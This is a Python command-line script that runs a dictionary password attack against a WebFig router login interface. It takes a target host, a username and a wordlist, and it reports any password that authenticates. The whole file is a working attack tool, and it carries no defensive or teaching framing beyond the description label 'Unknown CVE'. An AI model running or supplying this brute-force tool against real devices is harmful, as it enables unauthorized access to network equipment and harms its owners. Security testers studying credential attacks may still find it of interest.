import sys
import argparse
from webfig import WebFig

if __name__=='__main__':

	parser = argparse.ArgumentParser(description='Unknown CVE')
	parser.add_argument('--rhost', action="store", dest="rhost", required=True, help="The remote address to brute force")
	parser.add_argument('--rport', action="store", dest="rport", default=80, help="The remote port to brute force")
	parser.add_argument('--username', action="store", dest="username", required=True, help="The username to authenticate with")
	parser.add_argument('--dictionary', action="store", dest="dictionary", required=True, help="The passwords to authenticate with")
	args = parser.parse_args()

	attempt = 1
	with open(args.dictionary) as passwords:
		for password in passwords:
			print(f"Attempt {str(attempt)}\r", end='')
			attempt += 1

			try:
				password = password.strip()
				w = WebFig(args.rhost, args.rport, args.username, password)
				print(f"\nSuccess! Valid credentials:\n{args.username}:{password}")
				sys.exit(0)
			except ValueError as e:
				pass
	
	print("Dictionary completed. No successful credentials found.")
